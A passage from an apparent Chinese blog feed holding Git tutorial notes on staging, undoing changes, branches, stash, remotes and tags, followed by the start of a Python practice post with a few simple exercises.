<p>Git的版本库里存了很多东西，其中最重要的就是称为stage（或者叫index）的暂存区，</p>
<p>还有Git为我们自动创建的第一个分支master，以及指向master的一个指针叫HEAD。</p>
<p><img data-src="./git%E5%AD%A6%E4%B9%A0/2.png" alt></p>
<hr>
<h4 id="用一张图片说明一下问题"><a href="#用一张图片说明一下问题" class="headerlink" title="用一张图片说明一下问题"></a>用一张图片说明一下问题</h4><p><img data-src="./git%E5%AD%A6%E4%B9%A0/3.png" alt></p>
<hr>
<h4 id="再用一张图说明一下"><a href="#再用一张图说明一下" class="headerlink" title="再用一张图说明一下"></a>再用一张图说明一下</h4><p><img data-src="./git%E5%AD%A6%E4%B9%A0/4.png" alt></p>
<hr>
<p><strong>把文件往Git版本库里添加的时候，是分两步执行的:</strong></p>
<p>第一步是用git add把文件添加进去，实际上就是把文件修改添加到暂存区；</p>
<p>第二步是用git commit提交更改，实际上就是把暂存区的所有内容提交到当前分支。</p>
<p>因为我们创建Git版本库时，Git自动为我们创建了唯一一个master分支，所以，现在，git commit就是往master分支上提交更改。</p>
<p>可以简单理解为，需要提交的文件修改通通放到暂存区，然后，一次性提交暂存区的所有修改。</p>
<hr>
<p><strong>git status 查看暂存区状态</strong></p>
<hr>
<h4 id="小结-1"><a href="#小结-1" class="headerlink" title="小结"></a>小结</h4><p>暂存区是Git非常重要的概念，弄明白了暂存区，就弄明白了Git的很多操作到底干了什么。</p>
<hr>
<h3 id="管理修改"><a href="#管理修改" class="headerlink" title="管理修改"></a>管理修改</h3><p>现在我们已经掌握暂存区的概念。</p>
<p>那么，为什么Git比其他版本控制系统设计得优秀，因为<strong>Git跟踪并管理的是修改，而非文件！</strong></p>
<h4 id="一个小点"><a href="#一个小点" class="headerlink" title="一个小点"></a>一个小点</h4><p>#####修改 -&gt; git add -&gt; 修改 -&gt; git commit</p>
<p>Git管理的是修改，当你用git add命令后，在工作区的第一次修改被放入暂存区，准备提交，但是，在工作区的第二次修改并没有放入暂存区，所以，git commit只负责把暂存区的修改提交了，也就是第一次的修改被提交了，第二次的修改不会被提交。</p>
<p><strong>git diff HEAD – readme.txt</strong>: 查看工作区和版本库里面最新版本的区别 </p>
<h4 id="小结-2"><a href="#小结-2" class="headerlink" title="小结"></a>小结</h4><p>Git是跟踪修改的，每次修改，如果不用git add到暂存区，那就不会加入到commit中！！！</p>
<hr>
<h3 id="撤销修改"><a href="#撤销修改" class="headerlink" title="撤销修改"></a>撤销修改</h3><h4 id="git-checkout-–-file-命令"><a href="#git-checkout-–-file-命令" class="headerlink" title="git checkout – file 命令"></a>git checkout – file 命令</h4><pre><code>&apos;&apos;&apos;
git checkout -- readme.txt
&apos;&apos;&apos;</code></pre><p>命令git checkout – readme.txt意思就是，把readme.txt文件在工作区的修改全部撤销，这里有两种情况：</p>
<ul>
<li><p>一种是readme.txt自修改后还没有被放到暂存区，现在，撤销修改就回到和版本库一模一样的状态；</p>
</li>
<li><p>一种是readme.txt已经添加到暂存区后，又作了修改，现在，撤销修改就回到添加到暂存区后的状态。</p>
<p>  <strong>总之，就是让这个文件回到最近一次git commit或git add时的状态。</strong></p>
<p> <strong>注:</strong> git checkout – file命令中的–很重要，没有–，就变成了“切换到另一个分支”的命令，后面的分支管理中会再次遇到git checkout命令。</p>
</li>
</ul>
<hr>
<h4 id="git-reset"><a href="#git-reset" class="headerlink" title="git reset"></a>git reset</h4><p>git reset HEAD <file>可以把暂存区的修改撤销掉（unstage），重新放回工作区。 git reset命令既可以回退版本，也可以把暂存区的修改回退到工作区。当我们用HEAD时，表示最新的版本。</file></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">// 1.txt 加上SB 然后 add 我们通通删除</span><br><span class="line">hasee@DESKTOP-H73LV3J MINGW64 /e/gitTest (master)</span><br><span class="line"><span class="meta">$</span><span class="bash"> vim 1.txt</span></span><br><span class="line"></span><br><span class="line">hasee@DESKTOP-H73LV3J MINGW64 /e/gitTest (master)</span><br><span class="line"><span class="meta">$</span><span class="bash"> git add 1.txt</span></span><br><span class="line"></span><br><span class="line">hasee@DESKTOP-H73LV3J MINGW64 /e/gitTest (master)</span><br><span class="line"><span class="meta">$</span><span class="bash"> git status</span></span><br><span class="line">On branch master</span><br><span class="line">Changes to be committed:</span><br><span class="line">  (use "git reset HEAD &lt;file&gt;..." to unstage)</span><br><span class="line"></span><br><span class="line">        modified:   1.txt</span><br><span class="line"></span><br><span class="line">hasee@DESKTOP-H73LV3J MINGW64 /e/gitTest (master)</span><br><span class="line"><span class="meta">$</span><span class="bash"> git reset HEAD 1.txt</span></span><br><span class="line">Unstaged changes after reset:</span><br><span class="line">M       1.txt</span><br><span class="line"></span><br><span class="line">hasee@DESKTOP-H73LV3J MINGW64 /e/gitTest (master)</span><br><span class="line"><span class="meta">$</span><span class="bash"> git status</span></span><br><span class="line">On branch master</span><br><span class="line">Changes not staged for commit:</span><br><span class="line">  (use "git add &lt;file&gt;..." to update what will be committed)</span><br><span class="line">  (use "git checkout -- &lt;file&gt;..." to discard changes in working directory)</span><br><span class="line"></span><br><span class="line">        modified:   1.txt</span><br><span class="line"></span><br><span class="line">no changes added to commit (use "git add" and/or "git commit -a")</span><br><span class="line"></span><br><span class="line">hasee@DESKTOP-H73LV3J MINGW64 /e/gitTest (master)</span><br><span class="line"><span class="meta">$</span><span class="bash"> git checkout -- 1.txt</span></span><br><span class="line"></span><br><span class="line">hasee@DESKTOP-H73LV3J MINGW64 /e/gitTest (master)</span><br><span class="line"><span class="meta">$</span><span class="bash"> git status</span></span><br><span class="line">On branch master</span><br><span class="line">nothing to commit, working tree clean</span><br></pre></td></tr></table></figure>

<h4 id="最后-整个世界终于安静了"><a href="#最后-整个世界终于安静了" class="headerlink" title="最后 整个世界终于安静了"></a>最后 整个世界终于安静了</h4><h4 id="小结-3"><a href="#小结-3" class="headerlink" title="小结"></a>小结</h4><ul>
<li><p>场景1：当你改乱了工作区某个文件的内容，想直接丢弃工作区的修改时，用命令git checkout – file。</p>
</li>
<li><p>场景2：当你不但改乱了工作区某个文件的内容，还添加到了暂存区时，想丢弃修改，分两步，第一步用命令git reset HEAD <file>，就回到了场景1，第二步按场景1操作。</file></p>
</li>
<li><p>场景3：已经提交了不合适的修改到版本库时，想要撤销本次提交，参考版本回退部分，不过前提是没有推送到远程库。</p>
</li>
</ul>
<hr>
<p>###删除文件</p>
<p><strong>删除也是一种修改操作</strong></p>
<ul>
<li>一般情况下，你通常直接在文件管理器中把没用的文件删了，或者用rm命令删了</li>
<li>这个时候，Git知道你删除了文件，因此，工作区和版本库就不一致了，git status命令会告诉你哪些文件被删除</li>
</ul>
<pre><code>&apos;&apos;&apos;

    hasee@DESKTOP-H73LV3J MINGW64 /e/gitTest (master)
    $ git add rmtest.txt

    hasee@DESKTOP-H73LV3J MINGW64 /e/gitTest (master)
    $ git commit -m &quot;rmtest&quot;
    [master 6f1cc01] rmtest
     1 file changed, 0 insertions(+), 0 deletions(-)
     create mode 100644 rmtest.txt

    hasee@DESKTOP-H73LV3J MINGW64 /e/gitTest (master)
    $ rm rmtest.txt

    hasee@DESKTOP-H73LV3J MINGW64 /e/gitTest (master)
    $ git status
    On branch master
    Changes not staged for commit:
      (use &quot;git add/rm &lt;file&gt;...&quot; to update what will be committed)
      (use &quot;git checkout -- &lt;file&gt;...&quot; to discard changes in working directory)

            deleted:    rmtest.txt

    no changes added to commit (use &quot;git add&quot; and/or &quot;git commit -a&quot;)

&apos;&apos;&apos;</code></pre><h4 id="这个时候有两个选择"><a href="#这个时候有两个选择" class="headerlink" title="这个时候有两个选择"></a>这个时候有两个选择</h4><p>1.确实要从版本库中删除该文件，那就用命令git rm删掉，并且git commit</p>
<pre><code>&apos;&apos;&apos;
    hasee@DESKTOP-H73LV3J MINGW64 /e/gitTest (master)
    $ rm rmtest.txt

    hasee@DESKTOP-H73LV3J MINGW64 /e/gitTest (master)
    $ git rm rmtest.txt
    rm &apos;rmtest.txt&apos;

    hasee@DESKTOP-H73LV3J MINGW64 /e/gitTest (master)
    $ git commit -m &quot;rm&quot;
    [master 8eac27a] rm
     1 file changed, 0 insertions(+), 0 deletions(-)
     delete mode 100644 rmtest.txt

&apos;&apos;&apos;</code></pre><p>2.删错了，版本库里还有，可以把误删的文件恢复到最新版本</p>
<pre><code>//git checkout其实是用版本库里的版本替换工作区的版本，无论工作区是修改还是删除，都可以 &quot;一键还原&quot;。
hasee@DESKTOP-H73LV3J MINGW64 /e/gitTest (master)
$ git checkout -- rmtest.txt

hasee@DESKTOP-H73LV3J MINGW64 /e/gitTest (master)
$ ls
1.txt  license  readme.txt  rmtest.txt

hasee@DESKTOP-H73LV3J MINGW64 /e/gitTest (master)
$ rm rmtest.txt

hasee@DESKTOP-H73LV3J MINGW64 /e/gitTest (master)
$ ls
1.txt  license  readme.txt

hasee@DESKTOP-H73LV3J MINGW64 /e/gitTest (master)
$ git checkout -- rmtest.txt

hasee@DESKTOP-H73LV3J MINGW64 /e/gitTest (master)
$ ls
1.txt  license  readme.txt  rmtest.txt</code></pre><h4 id="小结-4"><a href="#小结-4" class="headerlink" title="小结"></a>小结</h4><p>命令git rm用于删除一个文件。如果一个文件已经被提交到版本库，那么你永远不用担心误删，但是要小心，你只能恢复文件到最新版本，你会丢失最近一次提交后你修改的内容。</p>
<hr>
<h2 id="第三部分-远程仓库"><a href="#第三部分-远程仓库" class="headerlink" title="第三部分 远程仓库"></a>第三部分 远程仓库</h2><h3 id="添加远程库"><a href="#添加远程库" class="headerlink" title="添加远程库"></a>添加远程库</h3><p>当我们在 github 或者 码云上建立了仓库之后 </p>
<h5 id="关联一个远程仓库"><a href="#关联一个远程仓库" class="headerlink" title="关联一个远程仓库"></a>关联一个远程仓库</h5><pre><code># git remote add + 名字 + url(http or ssh)
git remote add origin git@github.com:michaelliao/learngit.git</code></pre><h4 id="小结-5"><a href="#小结-5" class="headerlink" title="小结"></a>小结</h4><ul>
<li><p>要关联一个远程库，使用命令git remote add origin git@server-name:path/repo-name.git</p>
</li>
<li><p>关联后，使用命令git push -u origin master第一次推送master分支的所有内容</p>
<h1 id="git-push-u-远程仓库名-本地分支-远程分支"><a href="#git-push-u-远程仓库名-本地分支-远程分支" class="headerlink" title="git push -u 远程仓库名 本地分支:远程分支"></a>git push -u 远程仓库名 本地分支:远程分支</h1><p>  git push -u origin master</p>
</li>
</ul>
<ul>
<li>此后，每次本地提交后，只要有必要，就可以使用命令git push origin master推送最新修改</li>
<li>分布式版本系统的最大好处之一是在本地工作完全不需要考虑远程库的存在，也就是有没有联网都可以正常工作，而        SVN在没有联网的时候是拒绝干活的！当有网络的时候，再把本地提交推送一下就完成了同步！</li>
</ul>
<hr>
<h3 id="从远程库中克隆"><a href="#从远程库中克隆" class="headerlink" title="从远程库中克隆"></a>从远程库中克隆</h3><h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><ul>
<li><p>要克隆一个仓库，首先必须知道仓库的地址，然后使用git clone命令克隆。</p>
</li>
<li><p>Git支持多种协议，包括https，但通过ssh支持的原生git协议速度最快。</p>
</li>
</ul>
<hr>
<h2 id="第四部分-分支管理"><a href="#第四部分-分支管理" class="headerlink" title="第四部分 分支管理"></a>第四部分 分支管理</h2><h3 id="一个例子"><a href="#一个例子" class="headerlink" title="一个例子"></a>一个例子</h3><p>分支在实际中有什么用呢？假设你准备开发一个新功能，但是需要两周才能完成，第一周你写了50%的代码，如果立刻提交，由于代码还没写完，不完整的代码库会导致别人不能干活了。如果等代码全部写完再一次提交，又存在丢失每天进度的巨大风险。</p>
<p>现在有了分支，就不用怕了。你创建了一个属于你自己的分支，别人看不到，还继续在原来的分支上正常工作，而你在自己的分支上干活，想提交就提交，直到开发完毕后，再一次性合并到原来的分支上，这样，既安全，又不影响别人工作。</p>
<p>其他版本控制系统如SVN等都有分支管理，但是用过之后你会发现，这些版本控制系统创建和切换分支比蜗牛还慢，简直让人无法忍受，结果分支功能成了摆设，大家都不去用。</p>
<p>但Git的分支是与众不同的，无论创建、切换和删除分支，Git在1秒钟之内就能完成！无论你的版本库是1个文件还是1万个文件。</p>
<h3 id="git-的分支管理大多是-通过指针完成的，实现速度快"><a href="#git-的分支管理大多是-通过指针完成的，实现速度快" class="headerlink" title="git 的分支管理大多是 通过指针完成的，实现速度快"></a>git 的分支管理大多是 通过指针完成的，实现速度快</h3><hr>
<h3 id="创建和合并分支"><a href="#创建和合并分支" class="headerlink" title="创建和合并分支"></a>创建和合并分支</h3><h4 id="相关的一些指令"><a href="#相关的一些指令" class="headerlink" title="相关的一些指令"></a>相关的一些指令</h4><ul>
<li>查看分支：git branch</li>
<li>创建分支：git branch <name></name></li>
<li>切换分支：git checkout <name></name></li>
<li>创建+切换分支：git checkout -b <name></name></li>
<li>合并某分支到当前分支：git merge <name></name></li>
<li>删除分支：git branch -d <name></name></li>
<li>强制删除分支：git branch -D <name></name></li>
</ul>
<hr>
<h4 id="一些备注"><a href="#一些备注" class="headerlink" title="一些备注"></a>一些备注</h4><pre><code>git checkout命令加上-b参数表示创建并切换，相当于以下两条命令：
$ git branch dev
$ git checkout dev
Switched to branch &apos;dev&apos;

git branch命令会列出所有分支，当前分支前面会标一个*号

$ git merge dev
Updating 0bac5c7..3bee747
Fast-forward
 test     | 1 +
 test.txt | 4 ++++
 2 files changed, 5 insertions(+)
 create mode 100644 test
一个小点： 这里的 Fast-forward 表示合并是“快进模式”，也就是直接把master指向dev的当前提交，所以合并速度非常快</code></pre><hr>
<h3 id="解决冲突"><a href="#解决冲突" class="headerlink" title="解决冲突"></a>解决冲突</h3><h4 id="什么是冲突-我们用一张图来表示"><a href="#什么是冲突-我们用一张图来表示" class="headerlink" title="什么是冲突(我们用一张图来表示)"></a>什么是冲突(我们用一张图来表示)</h4><p><img data-src="./git%E5%AD%A6%E4%B9%A0/5.png" alt></p>
<h5 id="此时feature1-和-master-不可以合并-因为有一些文件是冲突的"><a href="#此时feature1-和-master-不可以合并-因为有一些文件是冲突的" class="headerlink" title="此时feature1 和 master 不可以合并 因为有一些文件是冲突的"></a>此时feature1 和 master 不可以合并 因为有一些文件是冲突的</h5><h4 id="解决冲突-1"><a href="#解决冲突-1" class="headerlink" title="解决冲突"></a>解决冲突</h4><ul>
<li>当Git无法自动合并分支时，就必须首先解决冲突。解决冲突后，再提交，合并完成。</li>
<li>解决冲突就是把Git合并失败的文件手动编辑为我们希望的内容，再提交。</li>
<li>用git log –graph命令可以看到分支合并图。</li>
</ul>
<h5 id="小点"><a href="#小点" class="headerlink" title="小点"></a>小点</h5><ul>
<li>Git用&lt;&lt;&lt;&lt;&lt;&lt;&lt;，=======，&gt;&gt;&gt;&gt;&gt;&gt;&gt;标记出不同分支的内容</li>
<li>git log –graph –pretty=oneline –abbrev-commit</li>
</ul>
<hr>
<p>###分支管理策略</p>
<h4 id="通常情况"><a href="#通常情况" class="headerlink" title="通常情况"></a>通常情况</h4><ul>
<li>大多数默认的情况，Git合并分支的时候会使用Fast forward模式，但这种模式下，删除分支后，会丢掉分支信息。</li>
<li>如果要强制禁用Fast forward模式，Git就会在merge时生成一个新的commit，这样，从分支历史上就可以看出分支信息。</li>
<li>强制禁用Fast forward模式的方法，–no-ff 方式的git merge </li>
<li>因为算是一个commit 所以我们也要加上 -m参数</li>
<li>一个栗子： git merge –no-ff -m “merge with no-ff” dev</li>
<li>查看分支历史 git log –graph –pretty=oneline –abbrev-commit </li>
<li>–abbrev-commit 会简化 commit ID的长度 使 git log 更加清晰可见 </li>
</ul>
<h4 id="一张图说明一下最终的结果"><a href="#一张图说明一下最终的结果" class="headerlink" title="一张图说明一下最终的结果"></a>一张图说明一下最终的结果</h4><p><img data-src="./git%E5%AD%A6%E4%B9%A0/6.png" alt></p>
<h4 id="分支策略"><a href="#分支策略" class="headerlink" title="分支策略"></a>分支策略</h4><h5 id="在实际开发中，我们应该按照几个基本原则进行分支管理："><a href="#在实际开发中，我们应该按照几个基本原则进行分支管理：" class="headerlink" title="在实际开发中，我们应该按照几个基本原则进行分支管理："></a>在实际开发中，我们应该按照几个基本原则进行分支管理：</h5><ul>
<li><p>master分支应该是非常稳定的，也就是仅用来发布新版本，平时不能在上面干活</p>
</li>
<li><p>在dev分支上敢干活，也就是说，dev分支是不稳定的(多用于测试版本)，到某个时候，比如1.0版本发布时，再把dev分支合并到master上，在master分支发布1.0版本；</p>
</li>
<li><p>其它每个人都在dev分支上干活，每个人都有自己的分支，时不时地往dev分支上合并就OK。</p>
</li>
</ul>
<h5 id="举一个示意图"><a href="#举一个示意图" class="headerlink" title="举一个示意图"></a>举一个示意图</h5><p><img data-src="./git%E5%AD%A6%E4%B9%A0/7.png" alt></p>
<h5 id="一点小结"><a href="#一点小结" class="headerlink" title="一点小结"></a>一点小结</h5><ul>
<li>Git分支十分强大，在团队开发中应该充分应用。</li>
<li>合并分支时，加上–no-ff参数就可以用普通模式合并，合并后的历史有分支，能看出来曾经做过合并，而fast forward合并就看不出来曾经做过合并。</li>
</ul>
<hr>
<h3 id="Bug分支"><a href="#Bug分支" class="headerlink" title="Bug分支"></a>Bug分支</h3><h4 id="试用情景介绍"><a href="#试用情景介绍" class="headerlink" title="试用情景介绍"></a>试用情景介绍</h4><p>软件开发中，bug就像家常便饭一样。有了bug就需要修复，在Git中，由于分支是如此的强大，所以，每个bug都可以通过一个新的临时分支来修复，修复后，合并分支，然后将临时分支删除。</p>
<p>当你接到一个修复一个代号101的bug的任务时，很自然地，你想创建一个分支issue-101来修复它，但是，等等，当前正在dev上进行的工作还没有提交：</p>
<p>并不是你不想提交，而是工作只进行到一半，还没法提交，预计完成还需1天时间。但是，必须在两个小时内修复该bug，怎么办？</p>
<p>幸好，Git还提供了一个stash功能，可以把当前工作现场“储藏”起来，等以后恢复现场后继续工作。</p>
<ul>
<li>相当于把当前所有的工作暂时保存下来，创建一个崭新的工作区，当修复bug完成后，我们把之前暂存的全部复原</li>
</ul>
<h4 id="指令啦"><a href="#指令啦" class="headerlink" title="指令啦"></a>指令啦</h4><ul>
<li>git stash # 把当前工作现场“储藏”起来，等以后恢复现场后继续工作</li>
<li>git stash list # 查看所有暂存的工作现场</li>
</ul>
<hr>
<pre><code>$ git stash list
stash@{0}: WIP on dev: f52c633 add merge</code></pre><h4 id="恢复的两个方法"><a href="#恢复的两个方法" class="headerlink" title="恢复的两个方法"></a>恢复的两个方法</h4><ul>
<li>git stash apply恢复，但是恢复后，stash内容并不删除，你需要用git stash drop来删除</li>
<li>git stash pop，恢复的同时把stash内容也删了</li>
<li>可以多次stash，恢复的时候，先用git stash list查看，然后恢复指定的stash，用相应的命令：</li>
</ul>
<hr>
<pre><code>$ git stash apply stash@{0}</code></pre><h4 id="小结-6"><a href="#小结-6" class="headerlink" title="小结"></a>小结</h4><ul>
<li><p>修复bug时，我们会通过创建新的bug分支进行修复，然后合并，最后删除；</p>
</li>
<li><p>当手头工作没有完成时，先把工作现场git stash一下，然后去修复bug，修复后，再git stash pop，回到工作现场。    </p>
</li>
</ul>
<hr>
<h3 id="Feature分支"><a href="#Feature分支" class="headerlink" title="Feature分支"></a>Feature分支</h3><h4 id="试用场景"><a href="#试用场景" class="headerlink" title="试用场景"></a>试用场景</h4><p>上司给你一个绝密的工作，创造世界！优秀的程序员用了5min搞定(创建新的feature分支，开发，准备合并分支到master后删除此feature分支)(hhh，前一个括号中的东西还没做)，上司又说，经费不足！！！(TMD)，虽然想骂人，但是我们还是要将这个机密的feature分支删除掉。</p>
<pre><code>$ git branch -d feature-vulcan
error: The branch &apos;feature-vulcan&apos; is not fully merged.
If you are sure you want to delete it, run &apos;git branch -D feature-vulcan&apos;. 

Git友情提醒，feature-vulcan分支还没有被合并，如果删除，将丢失掉修改，如果要强行删除，需要使用大写的-D参数。

强行删除
$ git branch -D feature-vulcan
Deleted branch feature-vulcan (was 287773e).</code></pre><h4 id="一些总结"><a href="#一些总结" class="headerlink" title="一些总结"></a>一些总结</h4><ul>
<li><p>开发一个新feature，最好新建一个分支</p>
</li>
<li><p>如果要丢弃一个没有被合并过的分支，可以通过git branch -D <name>强行删除。</name></p>
</li>
</ul>
<hr>
<h3 id="多人合作"><a href="#多人合作" class="headerlink" title="多人合作"></a>多人合作</h3><h4 id="这部分主要是讲解一些远程库的使用-公用一个远程库"><a href="#这部分主要是讲解一些远程库的使用-公用一个远程库" class="headerlink" title="这部分主要是讲解一些远程库的使用(公用一个远程库)"></a>这部分主要是讲解一些远程库的使用(公用一个远程库)</h4><h4 id="查看远程库的信息指令"><a href="#查看远程库的信息指令" class="headerlink" title="查看远程库的信息指令"></a>查看远程库的信息指令</h4><ul>
<li>git remote #查看远程库的信息</li>
<li>git remote -v #显示更详细的信息</li>
</ul>
<h4 id="推送分支指令"><a href="#推送分支指令" class="headerlink" title="推送分支指令"></a>推送分支指令</h4><ul>
<li><p>推送分支，就是把该分支上的所有本地提交推送到远程库。推送时，要指定本地分支，这样，Git就会把该分支推送到远程库对应的远程分支上： git push origin master</p>
</li>
<li><p>如果要推送其他分支，比如dev，就改成： git push origin dev</p>
</li>
</ul>
<h4 id="一些小结"><a href="#一些小结" class="headerlink" title="一些小结"></a>一些小结</h4><ul>
<li>master分支是主分支，因此要时刻与远程同步</li>
<li>dev分支是开发分支，团队所有成员都需要在上面工作，所以也需要与远程同步</li>
<li>bug分支只用于在本地修复bug，就没必要推到远程了，除非老板要看看你每周到底修复了几个bug</li>
<li>feature分支是否推到远程，取决于你是否和你的小伙伴合作在上面开发</li>
<li>总之，就是在Git中，分支完全可以在本地自己藏着玩，是否推送，视你的心情而定！</li>
</ul>
<h4 id="抓取分支"><a href="#抓取分支" class="headerlink" title="抓取分支"></a>抓取分支</h4><p>场景介绍，多人协作时，大家都会往master和dev分支上推送各自的修改，当你的伙伴push了新的dev分支(git checkout -b dev origin/dev),然后他开始修改etc，而你也有一个dev，并且改了一些东西准备push，这时候会有冲突(远程仓库不一样了啦)。导致你的推送失败，因为你的小伙伴的最新提交和你试图推送的提交有冲突。</p>
<p><strong>解决办法也很简单，Git已经提示我们，先用git pull把最新的提交从origin/dev抓下来，然后，在本地合并，解决冲突，再推送！git pull也失败了，原因是没有指定本地dev分支与远程origin/dev分支的链接，根据提示，设置dev和origin/dev的链接</strong></p>
<pre><code>git branch --set-upstream-to=origin/dev dev
# 之后git pull
git pull

之后可能合并的时候会有冲突，按照之前解决冲突的方法修改文件即可！</code></pre><h4 id="小结-7"><a href="#小结-7" class="headerlink" title="小结"></a>小结</h4><p>因此，多人协作的工作模式通常是这样：</p>
<p>首先，可以试图用git push origin <branch-name>推送自己的修改；</branch-name></p>
<p>如果推送失败，则因为远程分支比你的本地更新，需要先用git pull试图合并；</p>
<p>如果合并有冲突，则解决冲突，并在本地提交；</p>
<p>没有冲突或者解决掉冲突后，再用git push origin <branch-name>推送就能成功！</branch-name></p>
<p>如果git pull提示no tracking information，则说明本地分支和远程分支的链接关系没有创建，用命令git branch –set-upstream-to <branch-name> origin/<branch-name>。</branch-name></branch-name></p>
<p>这就是多人协作的工作模式，一旦熟悉了，就非常简单。</p>
<p>查看远程库信息，使用git remote -v；</p>
<p>本地新建的分支如果不推送到远程，对其他人就是不可见的；</p>
<p>从本地推送分支，使用git push origin branch-name，如果推送失败，先用git pull抓取远程的新提交；</p>
<p>在本地创建和远程分支对应的分支，使用git checkout -b branch-name origin/branch-name，本地和远程分支的名称最好一致；</p>
<p>建立本地分支和远程分支的关联，使用git branch –set-upstream branch-name origin/branch-name；</p>
<p>从远程抓取分支，使用git pull，如果有冲突，要先处理冲突。</p>
<hr>
<h3 id="Rebase"><a href="#Rebase" class="headerlink" title="Rebase"></a>Rebase</h3><h4 id="Git有一种称为rebase的操作，有人把它翻译成“变基”"><a href="#Git有一种称为rebase的操作，有人把它翻译成“变基”" class="headerlink" title="Git有一种称为rebase的操作，有人把它翻译成“变基”"></a>Git有一种称为rebase的操作，有人把它翻译成“变基”</h4><h4 id="功能"><a href="#功能" class="headerlink" title="功能"></a>功能</h4><ul>
<li><p>rebase操作可以把本地未push的分叉提交历史整理成直线；</p>
</li>
<li><p>rebase的目的是使得我们在查看历史提交的变化时更容易，因为分叉的提交需要三方对比。</p>
<h2 id="标签管理"><a href="#标签管理" class="headerlink" title="标签管理"></a>标签管理</h2><p>简单理解，就是加一个标识符</p>
<h3 id="创建标签"><a href="#创建标签" class="headerlink" title="创建标签"></a>创建标签</h3></li>
</ul>
<h4 id="操作总结"><a href="#操作总结" class="headerlink" title="操作总结"></a>操作总结</h4><ul>
<li><p>命令git tag <tagname>用于新建一个标签，默认为HEAD，也可以指定一个commit id；</tagname></p>
</li>
<li><p>命令git tag -a <tagname> -m “blablabla…”可以指定标签信息；</tagname></p>
</li>
<li><p>命令git tag可以查看所有标签。</p>
</li>
</ul>
<h3 id="操作标签"><a href="#操作标签" class="headerlink" title="操作标签"></a>操作标签</h3><h4 id="操作总结-1"><a href="#操作总结-1" class="headerlink" title="操作总结"></a>操作总结</h4><ul>
<li><p>命令git push origin <tagname>可以推送一个本地标签；</tagname></p>
</li>
<li><p>命令git push origin –tags可以推送全部未推送过的本地标签；</p>
</li>
<li><p>命令git tag -d <tagname>可以删除一个本地标签；</tagname></p>
</li>
<li><p>命令git push origin :refs/tags/<tagname>可以删除一个远程标签。</tagname></p>
</li>
</ul>
<h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2>]]></content>
      <categories>
        <category>Git</category>
      </categories>
      <tags>
        <tag>Git</tag>
        <tag>基础知识</tag>
      </tags>
  </entry>
  <entry>
    <title>python语感专项-10</title>
    <url>/2020/02/22/blog_formal/%E5%BC%80%E5%8F%91/python/python100-10/</url>
    <content><![CDATA[<h1 id="python语感专项"><a href="#python语感专项" class="headerlink" title="python语感专项"></a>python语感专项</h1><h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>和我们学习任何一门语言一样，一个很重要的点就是培养语感，本文来自互联网整理+自己的见解</p>
<a id="more"></a>

<h2 id="第十拍"><a href="#第十拍" class="headerlink" title="第十拍"></a>第十拍</h2><p>91、对 3.1415926 四舍五入，保留小数点后5位</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test91</span><span class="params">()</span>:</span></span><br><span class="line">    print(<span class="string">"begin test 91"</span>)</span><br><span class="line">    test_num = <span class="number">3.1415926</span></span><br><span class="line">    print(<span class="string">"ori test_num = &#123;0&#125;"</span>.format(test_num))</span><br><span class="line">    test_num = round(test_num, <span class="number">5</span>)</span><br><span class="line">    print(<span class="string">"res test_num = &#123;0&#125;"</span>.format(test_num))</span><br><span class="line">&gt;&gt;&gt;</span><br><span class="line">    begin test <span class="number">91</span></span><br><span class="line">    ori test_num = <span class="number">3.1415926</span></span><br><span class="line">    res test_num = <span class="number">3.14159</span></span><br></pre></td></tr></table></figure>

<p>92、判断两个对象是在内存中是否是同一个</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test92</span><span class="params">()</span>:</span></span><br><span class="line">    print(<span class="string">"begin test 92"</span>)</span><br><span class="line">    a = <span class="number">1</span></span><br><span class="line">    b = a</span><br><span class="line">    c = <span class="number">2</span></span><br><span class="line">    print(<span class="string">"id(a) == id(b) = &#123;0&#125; id(a) == id(c) = &#123;1&#125;"</span>.format(id(a)==id(b), id(a)==id(c)))</span><br><span class="line">&gt;&gt;&gt;</span><br><span class="line">    begin test <span class="number">92</span></span><br><span class="line">    id(a) == id(b) = <span class="literal">True</span> id(a) == id(c) = <span class="literal">False</span></span><br></pre></td></tr></table></figure>

<p>93、返回给定对象的属性和方法</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test93</span><span class="params">()</span>:</span></span><br><span class="line">    print(<span class="string">"begin test 93"</span>)</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">test</span>:</span></span><br><span class="line">        b = <span class="number">1</span></span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">()</span>:</span></span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">a</span><span class="params">(self)</span>:</span></span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">    print(<span class="string">"dir(test) = &#123;0&#125;"</span>.format(dir(test)))</span><br><span class="line">&gt;&gt;&gt;</span><br><span class="line">    begin test <span class="number">93</span></span><br><span class="line">    dir(test) = [<span class="string">'__class__'</span>, <span class="string">'__delattr__'</span>, <span class="string">'__dict__'</span>, <span class="string">'__dir__'</span>, <span class="string">'__doc__'</span>, <span class="string">'__eq__'</span>, <span class="string">'__format__'</span>, <span class="string">'__ge__'</span>, <span class="string">'__getattribute__'</span>, <span class="string">'__gt__'</span>, <span class="string">'__hash__'</span>, <span class="string">'__init__'</span>, <span class="string">'__init_subclass__'</span>, <span class="string">'__le__'</span>, <span class="string">'__lt__'</span>, <span class="string">'__module__'</span>, <span class="string">'__ne__'</span>, <span class="string">'__new__'</span>, <span class="string">'__reduce__'</span>, <span class="string">'__reduce_ex__'</span>, <span class="string">'__repr__'</span>, <span class="string">'__setattr__'</span>, <span class="string">'__sizeof__'</span>, <span class="string">'__str__'</span>, <span class="string">'__subclasshook__'</span>, <span class="string">'__weakref__'</span>, <span class="string">'a'</span>, <span class="string">'b'</span>]</span><br></pre></td></tr></table></figure>

<p>94、计算字符串表达式 ‘(2+3)*5’ 的值</p>
